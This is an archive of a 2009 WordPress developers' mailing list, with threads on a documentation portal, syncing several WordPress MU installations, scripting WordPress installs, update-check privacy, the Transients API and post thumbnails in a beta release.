	<9aa12a490912130029i6184d388g451853535d2f4fc2@mail.gmail.com>
Message-ID: <5a1dad880912130920h6b5381fao61669d59f5215f2d@mail.gmail.com>

It would be great if users could export their WordPress.com stats data and
be able to import that into a WordPress.org blog..

The same applies the other way around; if you're running a .org blog and
decide to move over to WordPress.com it would be great to be able to take
your stats with you as well as posts etc which we currently can.

Perhaps a stats based WXR file?

-- Alex  (Hempsworth)

From beau at dentedreality.com.au  Sun Dec 13 17:26:23 2009
From: beau at dentedreality.com.au (Beau Lebens)
Date: Sun, 13 Dec 2009 14:26:23 -0300
Subject: [wp-hackers] Developer portal
In-Reply-To: <299277.18493.qm@web65707.mail.ac4.yahoo.com>
References: <299277.18493.qm@web65707.mail.ac4.yahoo.com>
Message-ID: <902424490912130926l2edaad42v6f8b9bb8e40b9143@mail.gmail.com>

> I'd love to see clear indications of both the WP version the info was written for, as well as when the entry was written/updated.

I definitely agree with this, it would be very helpful (ideally all
information would just be up to date, but obviously that's not going
to always be the case).

> That might be able to ease upkeep as well if reminders to the author(s) could be set based on version or date. For instance, a reminder could be sent out to check/update content on WP version change or after six months or so.

We could just send out a reminder every time a major version of WP is released.

From mikeschinkel at newclarity.net  Sun Dec 13 17:49:38 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 13 Dec 2009 12:49:38 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <299277.18493.qm@web65707.mail.ac4.yahoo.com>
References: <299277.18493.qm@web65707.mail.ac4.yahoo.com>
Message-ID: <256D5C1E-3439-4654-9741-33012EEF84F5@newclarity.net>

If WordPress itself were used for this portal we could use tags having the version number to indicate when a page has been updated and/or reviewed to make sure it has considered a given version. This would also allow pulling a query of everything that has not been tagged with the current version making it easier to divide and conquer.

-Mike

On Dec 13, 2009, at 11:28 AM, Tuna Can wrote:

> WordPress is evolving so quickly making parts of the Codex out of date with every release. It's hard to tell what information is 'correct' or current, ESPECIALLY when you are new to WP and relying on the Codex to show you the way. 
> 
> I'd love to see clear indications of both the WP version the info was written for, as well as when the entry was written/updated.
> 
> That might be able to ease upkeep as well if reminders to the author(s) could be set based on version or date. For instance, a reminder could be sent out to check/update content on WP version change or after six months or so.
> 
> Thanks,
> 
> Tony
> 
> 
>      __________________________________________________________________
> Ask a question on any topic and get answers from real people. Go to Yahoo! Answers and share what you know at http://ca.answers.yahoo.com
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From feeds at armeda.com  Sun Dec 13 17:53:55 2009
From: feeds at armeda.com (Dre Armeda)
Date: Sun, 13 Dec 2009 09:53:55 -0800
Subject: [wp-hackers] Developer portal
In-Reply-To: <256D5C1E-3439-4654-9741-33012EEF84F5@newclarity.net>
References: <299277.18493.qm@web65707.mail.ac4.yahoo.com>
	<256D5C1E-3439-4654-9741-33012EEF84F5@newclarity.net>
Message-ID: <4B252A33.1030508@armeda.com>

Well if it is to be built, we need to eat our own dog food and build 
with WP.

Dre
http://armeda.com
@dremeda

On 12/13/09 9:49 AM, Mike Schinkel wrote:
> If WordPress itself were used for this portal we could use tags having the version number to indicate when a page has been updated and/or reviewed to make sure it has considered a given version. This would also allow pulling a query of everything that has not been tagged with the current version making it easier to divide and conquer.
>
> -Mike
>
> On Dec 13, 2009, at 11:28 AM, Tuna Can wrote:
>
>    
>> WordPress is evolving so quickly making parts of the Codex out of date with every release. It's hard to tell what information is 'correct' or current, ESPECIALLY when you are new to WP and relying on the Codex to show you the way.
>>
>> I'd love to see clear indications of both the WP version the info was written for, as well as when the entry was written/updated.
>>
>> That might be able to ease upkeep as well if reminders to the author(s) could be set based on version or date. For instance, a reminder could be sent out to check/update content on WP version change or after six months or so.
>>
>> Thanks,
>>
>> Tony
>>
>>
>>       __________________________________________________________________
>> Ask a question on any topic and get answers from real people. Go to Yahoo! Answers and share what you know at http://ca.answers.yahoo.com
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>      
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    

From nuno.morgadinho at gmail.com  Sun Dec 13 18:19:16 2009
From: nuno.morgadinho at gmail.com (Nuno Morgadinho)
Date: Sun, 13 Dec 2009 19:19:16 +0100
Subject: [wp-hackers] managing several MU installations
In-Reply-To: <4ede8f490912130829g3aee31cfk63daa4d1bb6a802f@mail.gmail.com>
References: <5721607d0912130400k25d1916ai7b60c94003f4a008@mail.gmail.com>
	<4ede8f490912130829g3aee31cfk63daa4d1bb6a802f@mail.gmail.com>
Message-ID: <5721607d0912131019q26d25497v25a056c8c22662ae@mail.gmail.com>

On Sun, Dec 13, 2009 at 5:29 PM, Vinicius Massuchetto
<viniciusandre at gmail.com> wrote:
> I wonder why would you need several wpmu installations.
> Are them on the same server and installed for the same purpose?

Nop. They are on different IP addresses. Imagine an organization where
each MU is for a different branch per country, but the configuration
is managed centrally by one entity.

> I believe that you can schedule SQL processes to sync data between
> options tables in your case, once I think it would be inconsistent to
> make multiple wpmu installations to use the same options table
> throught pure PHP code.

I want something more robust. Change in one place, affect everywhere,
kind of thing.

-- 
Nuno Morgadinho
http://www.morgadinho.org
http://twitter.com/morgadin

From jer at simianuprising.com  Sun Dec 13 18:45:04 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Sun, 13 Dec 2009 13:45:04 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B252A33.1030508@armeda.com>
References: <299277.18493.qm@web65707.mail.ac4.yahoo.com>
	<256D5C1E-3439-4654-9741-33012EEF84F5@newclarity.net>
	<4B252A33.1030508@armeda.com>
Message-ID: <e1202cb10912131045u19d3b0c9x3242ee569e04b323@mail.gmail.com>

I think the best function documentation is and should be the source
itself. When the PHPDoc descriptions are well done they are incredibly
useful, especially for people who use IDEs like NetBeans or Eclipse,
where the result is that you have the docs in your face as you write
your code (seriously guys, if you tried WP in an IDE before version
2.5 or so you should try it again, the value of autocomplete
skyrocketed with the addition of PHPDoc)

Whatever the solution for the function docs ends up being it should be
based on the phpdoc inside WP, at least for the core descriptions,
which can be up to several lines long and in many cases are all you
are likely to need when coding. Using PHPDoc also means that even if
this new reference gets old and dies the docs are still there and
tools like PHPXref will continue to derive intense utility from their
presence.

For longer descriptions and examples I think php.net is a clear winner
in terms of how to organize it. Offer at least one example for each
function and have a space for comments, along with a rating system
that votes comments up if they are useful. Stack Overflow is also
probably a good source of inspiration for the comments. If we thought
of the 'comments' as 'tips' or something and treated them as each
their own thing then a voting system would be really useful for
effectively defining best practices and having them show at the top.
If there was a manager of this thing they could also obviously
incorporate the best 'tips' into the core document itself. Maybe each
top-level comment is a 'tip', while sub-comments are comments on the
tip.

If the function reference doesn't inherently involve an Xref style
linking structure that explains where functions are used in core and
links back and forth to definitions then it should also include links
to a PHPxref install. I.e. on each function you'd have a link "See
this function defined in Xref" and "See uses of this function in WP
Core Xref" that link to the right places on Westi's phpxref
(preferably after migrating it to wordpress.org)

Ideally the solution would also simplify the process of helping to add
to the PHPdocs inside WP. Keeping all community documentation effort
inside the code itself is the best way to ensure that nothing is
duplicated and everything is kept up to date (after all, its easier to
double-check the actual function definition in the code when you edit
a function then to search the whole internet for code examples you've
deprecated).

IMHO it is currently too hard to help with the PHPDoc effort. While
for some of us using trunk SVN, exporting diffs, and using Trac feel
natural I think we can all agree that it is a specialized system and
is in no way obvious or friendly to people who just want to help with
documenting their favorite functions. Updating/adding a phpdoc should
only take a few minutes, and doesn't need to involved  learning the
byzantine ways of WP Core Development.

It seems to me that a submission process that removes all that cruft
would be very much worth it. Something like a button on the function
reference that says 'suggest a better phpdoc for this function'. The
user could then write a better doc and submit. At that point it could
be emailed to a core developer in charge of PHPDoc. For that core
developer turning the doc into a patch and committing would take like
2 minutes, be very unlikely to cause problems, and wouldn't involve a
long trac issue explaining it. They'd probably want to double-check
that the docs are accurate, but they have to do that anyway right now.
IMHO taking some text, incorporating it into their local working copy,
and committing it would probably take *less* time for a core dev than
dealing with a trac ticket and patch, as well as making it like 90%
faster for the submitter. I know I would use this tool even though I
know how to make patches and use trac.

In terms of best practice documents I've found that the most useful
docs are the ones that cover a whole API explicitly and
authoritatively. Codex articles like Widgets API, Shortcodes API etc
are very useful and provide a perfect place for wikipedia style
'external links' to articles that explain it in more personal terms.
In this new portal I think the function descriptions should be atomic
and anything else should be abstracted into some API that can have a
holistic page about its use. This way there are only two kinds of
pages, which IMHO will help with the redundancy experienced in the
codex. Each function doc should also link to any relevant APIs, which
wouldn't be too hard to do by just going through the (hopefully
relatively short) list of API articles and adding all that apply to
the function. If its actually based on WP then each API could even be
a category, and you could just check the categories appropriate for
each function (I think I just blew my own mind).

One last thing: There will need a paid Automattic employee who knows
how to code and is in charge of maintenance and updating things based
on user feedback. I hate to give up on the community does everything
model, but unless someone is personally responsible for this it will,
eventually, rot and crumble like the wiki.

Apologies for the incredibly long reply to an already long thread,
hope everyone is having a good Sunday :)

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From viniciusandre at gmail.com  Sun Dec 13 20:20:32 2009
From: viniciusandre at gmail.com (Vinicius Massuchetto)
Date: Sun, 13 Dec 2009 18:20:32 -0200
Subject: [wp-hackers] managing several MU installations
In-Reply-To: <5721607d0912131019q26d25497v25a056c8c22662ae@mail.gmail.com>
References: <5721607d0912130400k25d1916ai7b60c94003f4a008@mail.gmail.com>
	<4ede8f490912130829g3aee31cfk63daa4d1bb6a802f@mail.gmail.com>
	<5721607d0912131019q26d25497v25a056c8c22662ae@mail.gmail.com>
Message-ID: <4ede8f490912131220x735e3d92yfd9800d74e24dd92@mail.gmail.com>

On Sun, Dec 13, 2009 at 4:19 PM, Nuno Morgadinho
<nuno.morgadinho at gmail.com> wrote:
> On Sun, Dec 13, 2009 at 5:29 PM, Vinicius Massuchetto
> <viniciusandre at gmail.com> wrote:
>> I wonder why would you need several wpmu installations.
>> Are them on the same server and installed for the same purpose?
>
> Nop. They are on different IP addresses. Imagine an organization where
> each MU is for a different branch per country, but the configuration
> is managed centrally by one entity.

Ok.

>> I believe that you can schedule SQL processes to sync data between
>> options tables in your case, once I think it would be inconsistent to
>> make multiple wpmu installations to use the same options table
>> throught pure PHP code.
>
> I want something more robust. Change in one place, affect everywhere,
> kind of thing.

Register a hook to be ran every time any option of the blog is
changed. This hook must run a MySQL query that will update other
tables on other wpmu installations.

I would preffer to separate the script in one external file to be
fetched (e.g. with curl) by this hook, so you don't need to keep
updating passwords and IPs on every host.

An independent cron job would be more appropriate since this operation
may take a little time to be completed, but it's an expensive task
anyway.

Update just the desired field would be much better, and I'm not sure
how to do that, or even if that's possible with current Wordpress
structure.

--
Vinicius Massuchetto
http://vinicius.soylocoporti.org.br

From viniciusandre at gmail.com  Sun Dec 13 20:23:30 2009
From: viniciusandre at gmail.com (Vinicius Massuchetto)
Date: Sun, 13 Dec 2009 18:23:30 -0200
Subject: [wp-hackers] managing several MU installations
In-Reply-To: <4ede8f490912131220x735e3d92yfd9800d74e24dd92@mail.gmail.com>
References: <5721607d0912130400k25d1916ai7b60c94003f4a008@mail.gmail.com>
	<4ede8f490912130829g3aee31cfk63daa4d1bb6a802f@mail.gmail.com>
	<5721607d0912131019q26d25497v25a056c8c22662ae@mail.gmail.com>
	<4ede8f490912131220x735e3d92yfd9800d74e24dd92@mail.gmail.com>
Message-ID: <4ede8f490912131223g28964b5wc08601efa3b42a2d@mail.gmail.com>

On Sun, Dec 13, 2009 at 6:20 PM, Vinicius Massuchetto
<viniciusandre at gmail.com> wrote:
> On Sun, Dec 13, 2009 at 4:19 PM, Nuno Morgadinho
> <nuno.morgadinho at gmail.com> wrote:
>> On Sun, Dec 13, 2009 at 5:29 PM, Vinicius Massuchetto
>> <viniciusandre at gmail.com> wrote:
>>> I wonder why would you need several wpmu installations.
>>> Are them on the same server and installed for the same purpose?
>>
>> Nop. They are on different IP addresses. Imagine an organization where
>> each MU is for a different branch per country, but the configuration
>> is managed centrally by one entity.

Oh, sorry.

I can also see that happening in just one WordpressMU installation,
unless you're thinking about server load.

Hope I made myself clear.
--
Vinicius Massuchetto
http://vinicius.soylocoporti.org.br

From gigalinux at gmail.com  Sun Dec 13 20:30:51 2009
From: gigalinux at gmail.com (Dennis Morhardt)
Date: Sun, 13 Dec 2009 12:30:51 -0800
Subject: [wp-hackers] managing several MU installations
In-Reply-To: <4ede8f490912131220x735e3d92yfd9800d74e24dd92@mail.gmail.com>
Message-ID: <4b254f1a.0aec660a.2ce6.1a35@mx.google.com>



-- Gesendet ?meinem Palm (Device)
Vinicius Massuchetto schrieb:

On Sun, Dec 13, 2009 at 4:19 PM, Nuno Morgadinho

&lt;nuno.morgadinho at gmail.com> wrote:

> On Sun, Dec 13, 2009 at 5:29 PM, Vinicius Massuchetto

> &lt;viniciusandre at gmail.com> wrote:

>> I wonder why would you need several wpmu installations.

>> Are them on the same server and installed for the same purpose?

>

> Nop. They are on different IP addresses. Imagine an organization where

> each MU is for a different branch per country, but the configuration

> is managed centrally by one entity.



Ok.



>> I believe that you can schedule SQL processes to sync data between

>> options tables in your case, once I think it would be inconsistent to

>> make multiple wpmu installations to use the same options table

>> throught pure PHP code.

>

> I want something more robust. Change in one place, affect everywhere,

> kind of thing.



Register a hook to be ran every time any option of the blog is

changed. This hook must run a MySQL query that will update other

tables on other wpmu installations.



I would preffer to separate the script in one external file to be

fetched (e.g. with curl) by this hook, so you don't need to keep

updating passwords and IPs on every host.



An independent cron job would be more appropriate since this operation

may take a little time to be completed, but it's an expensive task

anyway.



Update just the desired field would be much better, and I'm not sure

how to do that, or even if that's possible with current Wordpress

structure.



--

Vinicius Massuchetto

http://vinicius.soylocoporti.org.br

_______________________________________________

wp-hackers mailing list

wp-hackers at lists.automattic.com

http://lists.automattic.com/mailman/listinfo/wp-hackers



From andre at thehook.eu  Sun Dec 13 20:33:54 2009
From: andre at thehook.eu (=?iso-8859-1?Q?Andr=E9?=)
Date: Sun, 13 Dec 2009 21:33:54 +0100 (CET)
Subject: [wp-hackers] Automate the installation of WordPress
Message-ID: <62961.193.75.63.21.1260736434.squirrel@webmail.mailadmin.no>

Hello,

I want to make a script that install WordPress for my users without going
through the install.php?step=1 and ..?step=2.

After what I have found there is a shell script made by Stephanie Booth
(http://climbtothestars.org/play/wordpress.sh.txt) but it is pretty old,
and is not working on the latest version of WP.

The script above would be perfect for me after some stripping, but the
"wget $url/wp-admin/install.php?step=x" does not work, as it requires an
email address as input.

I have been on the thought to just backup the whole database and change
the values I needed to, but then again all the times will be pretty old as
WP inserts comments and everything during installation that's dated on the
installation time.

Is there anywhere I can find the SQL in a separate file?


Thanks,
Andr?


From wordpress at dd32.id.au  Sun Dec 13 21:04:02 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Mon, 14 Dec 2009 08:04:02 +1100
Subject: [wp-hackers] Automate the installation of WordPress
In-Reply-To: <62961.193.75.63.21.1260736434.squirrel@webmail.mailadmin.no>
References: <62961.193.75.63.21.1260736434.squirrel@webmail.mailadmin.no>
Message-ID: <op.u4v940ctspxmuu@dd32>

Look into wp-admin/includes/schema.php from memory. Else its one of those  
files there, just search for CREATE TABLE..

You might also be able to do it by overriding some of the functions in the  
same file with a /wp-content/install.php file..

On Mon, 14 Dec 2009 07:33:54 +1100, Andr? <andre at thehook.eu> wrote:

> Hello,
>
> I want to make a script that install WordPress for my users without going
> through the install.php?step=1 and ..?step=2.
>
> After what I have found there is a shell script made by Stephanie Booth
> (http://climbtothestars.org/play/wordpress.sh.txt) but it is pretty old,
> and is not working on the latest version of WP.
>
> The script above would be perfect for me after some stripping, but the
> "wget $url/wp-admin/install.php?step=x" does not work, as it requires an
> email address as input.
>
> I have been on the thought to just backup the whole database and change
> the values I needed to, but then again all the times will be pretty old  
> as
> WP inserts comments and everything during installation that's dated on  
> the
> installation time.
>
> Is there anywhere I can find the SQL in a separate file?
>
>
> Thanks,
> Andr?
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From ozh at planetozh.com  Sun Dec 13 21:27:40 2009
From: ozh at planetozh.com (Ozh)
Date: Sun, 13 Dec 2009 22:27:40 +0100
Subject: [wp-hackers] Automate the installation of WordPress
In-Reply-To: <62961.193.75.63.21.1260736434.squirrel@webmail.mailadmin.no>
References: <62961.193.75.63.21.1260736434.squirrel@webmail.mailadmin.no>
Message-ID: <ae81acd10912131327w63bbc678sa05ac4d70b250c99@mail.gmail.com>

On Sun, Dec 13, 2009 at 9:33 PM, Andr? <andre at thehook.eu> wrote:
> Hello,
>
> I want to make a script that install WordPress for my users without going
> through the install.php?step=1 and ..?step=2.
>

<http://wpbits.wordpress.com/2007/08/10/automating-wordpress-customizations-the-installphp-way/>
might be what you need

-- 
http://planetOzh.com ~ Blog and WordPress Stuff
http://FrenchFragFactory.net ~ Daily Quake News

From jer at simianuprising.com  Sun Dec 13 23:46:57 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Sun, 13 Dec 2009 18:46:57 -0500
Subject: [wp-hackers] get_users() function
In-Reply-To: <349fe48b0912111430q357d7c25n2220889ee4a23dd3@mail.gmail.com>
References: <eaaa36c90912111412j1d88c3f2t31847282c934d8db@mail.gmail.com>
	<349fe48b0912111430q357d7c25n2220889ee4a23dd3@mail.gmail.com>
Message-ID: <e1202cb10912131546w7d58b2edgf0b27a8839ef2175@mail.gmail.com>

On Fri, Dec 11, 2009 at 5:30 PM, scribu <scribu at gmail.com> wrote:
> So here's a related ticket:
>
> http://core.trac.wordpress.org/ticket/10781


Here's another ticket I wrote up with lots of details about what would
be needed for a new get_user and get_users API:

http://core.trac.wordpress.org/ticket/8911

If only I was as prolific with patches as I am with trac tickets :P

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From jer at simianuprising.com  Sun Dec 13 23:53:01 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Sun, 13 Dec 2009 18:53:01 -0500
Subject: [wp-hackers] Plugin Privacy Option (was Revisiting phone home
	and privacy)
In-Reply-To: <4BE2C583-2DC1-49CF-BD18-D4493E61B48B@striderweb.com>
References: <4B1FC578.8010706@gaarai.com>
	<4BE2C583-2DC1-49CF-BD18-D4493E61B48B@striderweb.com>
Message-ID: <e1202cb10912131553m1f8a4346q3689d2c9a20bcc38@mail.gmail.com>

Chris: Your example was hilarious.

On Thu, Dec 10, 2009 at 11:39 PM, Stephen Rider
<wp-hackers at striderweb.com> wrote:
> 2) Personally I think this is more of a plugin area. ?"Disable Plugin Update Checks" could allow you to turn checks off entirely, or toggle checks on a plugin by plugin basis by modifying the array that is sent to the server.
>
> Personally I FAR prefer #2. ?New headers should be rare, and this doesn't seem like a best case for that. ?I think this could be done very nicely with a (not too complicated!) plugin, and I think that's what it should be.

+1, I liked the original idea but I like this better. Add a filter to
the updater and make sure its a two-liner to disable your plugin from
inside itself. Maybe this is already possible, if so someone please
just paste in the two lines and we can all relax about our nonexistent
super-private plugins.




-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From zamoose at gmail.com  Mon Dec 14 00:03:45 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Sun, 13 Dec 2009 19:03:45 -0500
Subject: [wp-hackers] Plugin Privacy Option (was Revisiting phone home
	and privacy)
In-Reply-To: <e1202cb10912131553m1f8a4346q3689d2c9a20bcc38@mail.gmail.com>
References: <4B1FC578.8010706@gaarai.com>
	<4BE2C583-2DC1-49CF-BD18-D4493E61B48B@striderweb.com> 
	<e1202cb10912131553m1f8a4346q3689d2c9a20bcc38@mail.gmail.com>
Message-ID: <71ddd7490912131603g71eb2e61nf1aa42de39cc6d00@mail.gmail.com>

On Sun, Dec 13, 2009 at 6:53 PM, Jeremy Clarke <jer at simianuprising.com>wrote:

>
> +1, I liked the original idea but I like this better. Add a filter to
> the updater and make sure its a two-liner to disable your plugin from
> inside itself. Maybe this is already possible, if so someone please
> just paste in the two lines and we can all relax about our nonexistent
> super-private plugins.
>
>
What about this: what if you added a Plugin-Update-URI header field to
plugins and themes? Themes or plugins without an explicitly-defined URI
would default to checking api.wordpress.org while plugin/theme devs that
don't (for whatever reasons) want to use the .org hosting environment can
host their own updates. Then, we could supply the necessary info for 3rd
parties to implement the expected return values from the update API and then
they, too, could take advantage of the internal WordPress upgrade checking,
further reducing ways that individual blogs can be compromised.

(I'm thinking particularly of cformsII and simple:press forums as heavy
no-auto-update offenders...)

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From jer at simianuprising.com  Mon Dec 14 00:47:00 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Sun, 13 Dec 2009 19:47:00 -0500
Subject: [wp-hackers] WP_Object_Cache problem
In-Reply-To: <161617690912110939o60a9a2c8h2a5094661424bcda@mail.gmail.com>
References: <008601ca7a80$f5dceee0$e196cca0$@com>
	<161617690912110939o60a9a2c8h2a5094661424bcda@mail.gmail.com>
Message-ID: <e1202cb10912131647j38a509dcob21c23f3f9fdad36@mail.gmail.com>

On Fri, Dec 11, 2009 at 12:39 PM, Otto <otto at ottodestruct.com> wrote:
> function get_transient($transient)
> function set_transient($transient, $value, $expiration = 0)
> function delete_transient($transient)

Dude you just blew my mind. I can now drop my custom wp_options
pseudocache system and also stop telling people they need to write
their own. IMHO this is one of the most needed functions in wordpress,
its too bad it was silently languishing for so long! I have slides to
update!

I haven't actually tried using them yet but I made a Codex article
based on your description and looking at the source. Anyone with
experience please take a look through and fix anything that's not
right.

http://codex.wordpress.org/Transients_API

-- 
Jeremy Clarke |
Code and Design | globalvoicesonline.org

From jer at simianuprising.com  Mon Dec 14 01:00:07 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Sun, 13 Dec 2009 20:00:07 -0500
Subject: [wp-hackers] Blog Stats from WordPress.com to stand-alone
	wordpress?..
In-Reply-To: <5a1dad880912130920h6b5381fao61669d59f5215f2d@mail.gmail.com>
References: <9aa12a490912110600l36ea8481o1442883e7546f79b@mail.gmail.com>
	<7f49e8010912110618v3952b38dg6720bf2d3a9eb423@mail.gmail.com>
	<9aa12a490912110756w2b8970e6y6d57e364deb503a7@mail.gmail.com>
	<9aa12a490912130029i6184d388g451853535d2f4fc2@mail.gmail.com>
	<5a1dad880912130920h6b5381fao61669d59f5215f2d@mail.gmail.com>
Message-ID: <e1202cb10912131700u6757e591ie258743449d81210@mail.gmail.com>

On Sun, Dec 13, 2009 at 12:20 PM, Alex Hempton-Smith
<hempsworth at googlemail.com> wrote:
> It would be great if users could export their WordPress.com stats data and
> be able to import that into a WordPress.org blog..

I'm pretty sure that in both cases all the data is stored on the .com
servers and just fetched by code in the dashboard. So what you want
isn't the ability to move the data, but to be able to transfer the
account to the external blog and have it pick up where the .com one
left off.

Seems like the actual linkage for external blogs is via your Akismet
API key installed on the .org blog, so what you'd want is a way to
tell the wordpress.com servers that you've moved and want to switch
the old stats to your API key. I can't find anything even approaching
that ability but I'm not good at wordpress.com navigation so maybe its
hidden.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From lists at rotorised.com  Mon Dec 14 01:02:06 2009
From: lists at rotorised.com (Ryan McCue)
Date: Mon, 14 Dec 2009 11:02:06 +1000
Subject: [wp-hackers] Blog Stats from WordPress.com to
	stand-alone	wordpress?..
In-Reply-To: <e1202cb10912131700u6757e591ie258743449d81210@mail.gmail.com>
References: <9aa12a490912110600l36ea8481o1442883e7546f79b@mail.gmail.com>	<7f49e8010912110618v3952b38dg6720bf2d3a9eb423@mail.gmail.com>	<9aa12a490912110756w2b8970e6y6d57e364deb503a7@mail.gmail.com>	<9aa12a490912130029i6184d388g451853535d2f4fc2@mail.gmail.com>	<5a1dad880912130920h6b5381fao61669d59f5215f2d@mail.gmail.com>
	<e1202cb10912131700u6757e591ie258743449d81210@mail.gmail.com>
Message-ID: <4B258E8E.1070001@rotorised.com>

Jeremy Clarke wrote:
> Seems like the actual linkage for external blogs is via your Akismet
> API key installed on the .org blog, so what you'd want is a way to
> tell the wordpress.com servers that you've moved and want to switch
> the old stats to your API key. I can't find anything even approaching
> that ability but I'm not good at wordpress.com navigation so maybe its
> hidden.
>   

I noticed the other day there is a select box on the API key page for
the plugin to change the location of a blog, I'm not sure if that works
with WP.com blogs though. Might be worth a try.

-- 
Ryan McCue
<http://ryanmccue.info/>


From me at anthony.geek.nz  Mon Dec 14 01:11:09 2009
From: me at anthony.geek.nz (Anthony Cole)
Date: Mon, 14 Dec 2009 14:11:09 +1300
Subject: [wp-hackers] add_theme_support in Beta 2
Message-ID: <9AEFB019-77A5-4E7F-890D-F1F4CE3CC668@anthony.geek.nz>

Anyone having problems with this? It's not loading the post thumbnails and coming up with an undefined function error after upgrading from beta one. 

-ac

From pete at jointforcestech.com  Mon Dec 14 03:00:15 2009
From: pete at jointforcestech.com (Pete Mall)
Date: Sun, 13 Dec 2009 19:00:15 -0800
Subject: [wp-hackers] add_theme_support in Beta 2
In-Reply-To: <9AEFB019-77A5-4E7F-890D-F1F4CE3CC668@anthony.geek.nz>
References: <9AEFB019-77A5-4E7F-890D-F1F4CE3CC668@anthony.geek.nz>
Message-ID: <7f49e8010912131900n7c374d3bmfd8087113297c478@mail.gmail.com>

It will not work if you are using post_image_* functions. You'll need to
use post_thumbnail_* instead.



On Sun, Dec 13, 2009 at 5:11 PM, Anthony Cole <me at anthony.geek.nz> wrote:

> Anyone having problems with this? It's not loading the post thumbnails and
> coming up with an undefined function error after upgrading from beta one.
>
> -ac
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp-hackers at striderweb.com  Mon Dec 14 04:18:00 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sun, 13 Dec 2009 22:18:00 -0600
Subject: [wp-hackers] Plugin Privacy Option (was Revisiting phone home
	and privacy)
In-Reply-To: <e1202cb10912131553m1f8a4346q3689d2c9a20bcc38@mail.gmail.com>
References: <4B1FC578.8010706@gaarai.com>
	<4BE2C583-2DC1-49CF-BD18-D4493E61B48B@striderweb.com>
	<e1202cb10912131553m1f8a4346q3689d2c9a20bcc38@mail.gmail.com>
Message-ID: <97C7DDBC-4FEC-443D-AEDF-FE9BA4990703@striderweb.com>


On Dec 13, 2009, at 5:53 PM, Jeremy Clarke wrote:

> On Thu, Dec 10, 2009 at 11:39 PM, Stephen Rider
> <wp-hackers at striderweb.com> wrote:
>> 2) Personally I think this is more of a plugin area.  "Disable Plugin Update Checks" could allow you to turn checks off entirely, or toggle checks on a plugin by plugin basis by modifying the array that is sent to the server.
> 
> +1, 
>  Maybe this is already possible, if so someone please
> just paste in the two lines and we can all relax about our nonexistent
> super-private plugins.

Something like this I think...

add_filter( 'option_update_plugins', array( &$this, 'filter_get_update_plugins' ) );
add_filter( 'transient_update_plugins', array( &$this, 'filter_get_update_plugins' ) ); // for cached data

function filter_get_update_plugins( $data ) {
	unset( $data->response['myplugin/myplugin.php'] );
	return $data;
}

Stephen

-- 
Stephen Rider
http://striderweb.com/


From wp-hackers at striderweb.com  Mon Dec 14 04:29:05 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sun, 13 Dec 2009 22:29:05 -0600
Subject: [wp-hackers] Plugin Privacy Option (was Revisiting phone home
	and privacy)
In-Reply-To: <71ddd7490912131603g71eb2e61nf1aa42de39cc6d00@mail.gmail.com>
References: <4B1FC578.8010706@gaarai.com>
	<4BE2C583-2DC1-49CF-BD18-D4493E61B48B@striderweb.com>
	<e1202cb10912131553m1f8a4346q3689d2c9a20bcc38@mail.gmail.com>
	<71ddd7490912131603g71eb2e61nf1aa42de39cc6d00@mail.gmail.com>
Message-ID: <31D97E2E-996B-48C9-B093-BFBE9AE6BBD9@striderweb.com>


On Dec 13, 2009, at 6:03 PM, Doug Stewart wrote:

> What about this: what if you added a Plugin-Update-URI header field to
> plugins and themes? Themes or plugins without an explicitly-defined URI
> would default to checking api.wordpress.org while plugin/theme devs that
> don't (for whatever reasons) want to use the .org hosting environment can
> host their own updates. Then, we could supply the necessary info for 3rd
> parties to implement the expected return values from the update API and then
> they, too, could take advantage of the internal WordPress upgrade checking,
> further reducing ways that individual blogs can be compromised.

My plugin code notwithstanding, I like Doug's idea a lot.


Also, said code cleaned up slightly:

add_filter( 'option_update_plugins', 'filter_get_update_plugins' );
add_filter( 'transient_update_plugins', 'filter_get_update_plugins' ); // for cached data

function filter_get_update_plugins( $data ) {
	unset( $data->response['myplugin/myplugin.php'] );
	return $data;
}

Stephen

-- 
Stephen Rider
http://striderweb.com/


From jayarjo at gmail.com  Mon Dec 14 07:51:43 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Mon, 14 Dec 2009 11:51:43 +0400
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <d7153760912130751h533bbad1p9c3405553a4585f5@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<4B244DE9.6050909@gaarai.com>
	<9aa12a490912130027v2ecf3f58j4a48582c2b9b0624@mail.gmail.com>
	<d7153760912130047x3092515fm4c2682a3d5e77a38@mail.gmail.com>
	<9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>
	<d7153760912130310j730d17edid3bfdae64bbc43a3@mail.gmail.com>
	<op.u4viywoaspxmuu@dd32>
	<9aa12a490912130338p4416e9eayeb5824097b8f6f01@mail.gmail.com>
